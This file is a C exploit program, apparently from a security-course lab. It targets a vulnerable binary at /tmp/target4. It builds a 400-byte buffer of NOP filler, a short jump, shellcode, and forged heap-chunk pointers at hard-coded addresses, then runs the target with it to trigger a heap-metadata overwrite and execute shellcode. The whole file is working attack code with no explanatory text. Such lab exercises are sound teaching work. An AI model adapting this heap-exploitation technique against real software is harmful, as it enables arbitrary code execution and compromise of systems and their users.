#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[400];
  int i;
  int dummy_r, chunk_l, chunk_r;

  chunk_l = 0x08059b78;
  chunk_r = 0xbffffcec;
  dummy_r = chunk_r + 1;

  for (i = 0; i < 400; i++){
/*
	if( i < 399){
		*(buf+i) = 'a';
	}
	else {
		*(buf+i) - '\x00';
	}

*/
     if( i < 2){
	*(buf+i) = '\x90';	//filler
     }
     else if(i < 4){
	memcpy((buf+i),"\xeb\x03",2);	//jump
        i++;
     }
     else if(i < 8){
	*(buf+i) = dummy_r >> ((i-4) * 8);	//fake right
     }
     else if (i < (32 - strlen(shellcode))){
	*(buf+i) = '\x90';	//NOP
     }
     else if (i < 32){
	*(buf+i) = shellcode[i-32+strlen(shellcode)];
     }
     else if (i < 36){
	*(buf+i) = chunk_l >> ((i - 32) * 8); //left
     }
     else if (i < 40){
	*(buf+i) = chunk_r >> ((i - 36) * 8);	//right
     }
     else if (i < 399){
	*(buf+i) = '\x90'; 	//filler
     }
     else {
	*(buf+i) = '\x00';
     }


  }


  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
